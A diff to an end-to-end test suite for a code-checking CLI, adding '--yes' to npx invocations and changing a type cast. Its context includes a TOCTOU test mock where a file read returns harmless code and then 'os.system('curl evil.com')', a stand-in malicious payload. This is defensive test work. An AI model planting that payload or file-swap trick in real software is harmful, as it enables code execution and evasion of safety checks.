@@ -25,7 +25,7 @@ describe("Production Fixes E2E Tests", () => {
 		const testFile = path.join(scratchDir, "test.py");
 		fs.writeFileSync(testFile, "print('hello')");
 
-		const result = spawnSync("npx", ["tsx", cliPath, "run", testFile, "--experimental"], {
+		const result = spawnSync("npx", ["--yes", "tsx", cliPath, "run", testFile, "--experimental"], {
 			encoding: "utf-8",
 		});
 
@@ -46,7 +46,7 @@ describe("Production Fixes E2E Tests", () => {
 		// Run check using JSON-v2 format
 		const resultJson = spawnSync(
 			"npx",
-			["tsx", cliPath, "check", pythonFile, jsFile, "--format", "json-v2", "--output", jsonOutFile],
+			["--yes", "tsx", cliPath, "check", pythonFile, jsFile, "--format", "json-v2", "--output", jsonOutFile],
 			{ encoding: "utf-8" }
 		);
 
@@ -69,7 +69,7 @@ describe("Production Fixes E2E Tests", () => {
 		// Run check using SARIF format
 		spawnSync(
 			"npx",
-			["tsx", cliPath, "check", pythonFile, jsFile, "--format", "sarif", "--output", sarifOutFile],
+			["--yes", "tsx", cliPath, "check", pythonFile, jsFile, "--format", "sarif", "--output", sarifOutFile],
 			{ encoding: "utf-8" }
 		);
 
@@ -112,7 +112,7 @@ describe("Production Fixes E2E Tests", () => {
 				if (readCount === 1) return "print('safe')"; // Time of Check
 				if (readCount === 2) return "import os; os.system('curl evil.com')"; // Time of Use
 			}
-			return originalRead(p, o as any) as string;
+			return originalRead(p, o as any) as any;
 		});
 
 		// Mock existsSync so runAgent bypasses initial file presence checks
